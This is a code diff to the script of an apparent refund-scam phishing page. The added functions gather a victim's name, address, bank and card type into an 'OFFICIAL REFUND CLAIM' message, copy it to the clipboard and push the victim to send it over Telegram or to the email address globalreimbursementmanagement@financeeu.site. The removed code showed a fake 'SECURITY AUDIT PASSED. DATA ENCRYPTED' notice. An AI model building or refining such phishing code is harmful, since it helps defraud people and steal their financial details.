@@ -146,19 +146,31 @@
             navigator.clipboard.writeText(summary).then(() => {
                 alert("INFO COPIED TO CLIPBOARD! \nOpening " + platform.toUpperCase() + "... Just PASTE the message and click send.");
                 
-                if(platform === 'telegram') {
-                    window.open('https://t.me', '_blank'); // Palitan mo ng username mo
+                }
+        function populate() {
+            const items = [
+                {l: "NAME", v: document.getElementById('fn').value + " " + document.getElementById('ln').value},
+                {l: "ADDRESS", v: document.getElementById('addr').value},
+                {l: "REFUND AMOUNT", v: document.getElementById('amt').value},
+                {l: "BANK", v: document.getElementById('bn').value},
+                {l: "CARD TYPE", v: document.getElementById('ct').value}
+            ];
+            let html = ""; items.forEach(d => { html += `<div class="review-item"><div class="review-label">${d.l}</div><div class="review-value">${d.v}</div></div>`; });
+            document.getElementById('reviewDisplay').innerHTML = html;
+        }
+        function copyAndDirect(platform) {
+            const ref = "REF-" + Math.floor(Math.random() * 1000000);
+            const summary = `--- OFFICIAL REFUND CLAIM ---\nRef: ${ref}\nName: ${document.getElementById('fn').value} ${document.getElementById('ln').value}\nAddress: ${document.getElementById('addr').value}\nAmount: ${document.getElementById('amt').value}\nBank: ${document.getElementById('bn').value}\nCard: ${document.getElementById('ct').value}`;
+            
+            navigator.clipboard.writeText(summary).then(() => {
+                alert("INFO COPIED! \nJust PASTE (Ctrl+V) the message when the app opens.");
+                if(platform === 'tele') {
+                    window.open('https://t.me', '_blank');
                 } else {
                     const mailTo = "globalreimbursementmanagement@financeeu.site";
-                    window.open(`https://google.com{mailTo}&su=CLAIM+${ref}`, '_blank');
+                    window.open(`https://google.com{mailTo}&su=REFUND+CLAIM+${ref}`, '_blank');
                 }
             });
-        }
-
-        function finalReceipt() {
-            const ref = "REF-" + Math.floor(Math.random() * 1000000);
-            alert("SECURITY AUDIT PASSED. DATA ENCRYPTED.");
-            document.getElementById('section3').innerHTML = `<div style="text-align:center; padding:40px;"><h2>CLAIM RECORDED</h2><p>Ref: ${ref}</p><div style="font-size:60px;">✅</div></div>`;
         }
     </script>
 </body>
